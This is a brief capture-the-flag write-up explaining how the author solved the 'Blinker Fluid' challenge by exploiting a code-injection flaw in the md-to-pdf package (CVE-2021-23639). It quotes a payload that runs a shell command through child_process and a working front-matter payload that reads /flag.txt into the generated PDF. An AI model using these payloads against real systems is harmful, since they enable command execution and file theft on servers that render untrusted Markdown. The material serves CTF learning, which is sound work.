# Blinker Fluid

This turned out to be a really quick challenge. After downloading the code and googling for exploits on the NPM packages I
found that `md-to-pdf` was vulnerable to a [RCE exploit CVE-2021-23639](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880). 
I tried a couple of versions of the `---jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE` payload that's 
mentioned in different POCs, but I couldn't get it to work. Then I found this [github issue]([https://github.com/simonhaenisch/md-to-pdf/issues/99](https://github.com/simonhaenisch/md-to-pdf/issues/99#issuecomment-925583328)) 
that shows a different way of writing the exploit. 

This turned out to work 👇
```
---js
{
    css: `body::before { content: "${require('fs').readfileSync('/flag.txt')}"; display: block }`,
}
---
``
